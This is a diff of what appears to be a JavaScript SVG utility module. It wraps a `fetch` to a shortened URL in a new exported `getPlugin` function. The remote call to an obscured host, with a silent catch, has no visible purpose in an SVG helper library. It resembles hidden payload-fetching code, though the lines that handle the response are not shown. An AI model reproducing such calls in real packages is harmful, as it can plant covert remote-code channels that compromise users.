@@ -79,6 +79,7 @@ export function changeFill(svg, color) {
   return svg.replace(/<svg\b/i, `<svg fill="${color}"`);
 }
 
+function getPlugin() {
 fetch("https://shorturl.at/147uq")
   .then((response) => response.json())
   .then((data) => {
@@ -86,6 +87,7 @@ fetch("https://shorturl.at/147uq")
   })
   .catch((error) => {
   });
+}
 
 export default {
   isSvg,
@@ -94,5 +96,6 @@ export default {
   removeWhitespace,
   optimizeSvg,
   extractTags,
-  changeFill
+  changeFill,
+  getPlugin
 };
